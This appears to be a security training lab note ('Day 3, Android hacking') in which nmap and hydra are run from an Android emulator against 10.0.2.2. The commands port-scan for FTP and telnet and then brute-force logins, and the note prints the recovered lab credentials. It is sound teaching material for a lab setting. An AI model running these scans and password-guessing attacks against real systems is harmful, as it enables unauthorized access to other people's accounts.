# Day 3

## Android hacking

### Launch android emulator
```
android-sdk-linux/tools/emulator @android17 -no-window
```

### Push word list to device
```
adb push wordlist.txt /data/local
```

### start up the ADB shell to run commands
```
adb shell
```

### view uploaded data
```
cd /data/local && ls
```

### Run Nmap from the device
```
./nmap -p 21,23 10.0.2.2

Starting Nmap 5.51 ( http://nmap.org ) at 2023-07-19 19:52 UTC
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.0.2.2
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.0033s latency).
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
MAC Address: 52:54:00:12:35:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.70 seconds
```

### Run hydra from the device against the telnet service
```
./hydra -l skillsetuser1 -p p@ssw0rd 10.0.2.2 telnet

[WARNING]Color not supported 
[WARNING]Check path to TERMINFO: /etc/terminfo 
[WARNING]Check terminal type: vt100 
Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-19 19:54:25
[WARNING] telnet is by its nature unreliable to analyze reliable, if possible better choose FTP or SSH if available
[DATA] 1 task, 1 server, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking service telnet on port 23
[23][telnet] host: 10.0.2.2   login: skillsetuser1   password: p@ssw0rd
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-19 19:54:26
```

### Run hydra from the device against the FTP service
```
./hydra -L wordlist.txt -P wordlist.txt 10.0.2.2 ftp


[WARNING]Color not supported 
[WARNING]Check path to TERMINFO: /etc/terminfo 
[WARNING]Check terminal type: vt100 
Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-19 19:55:14
[DATA] 16 tasks, 1 server, 49 login tries (l:7/p:7), ~3 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 10.0.2.2   login: student   password: password1
[21][ftp] host: 10.0.2.2   login: student   password: password123
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-19 19:55:23
```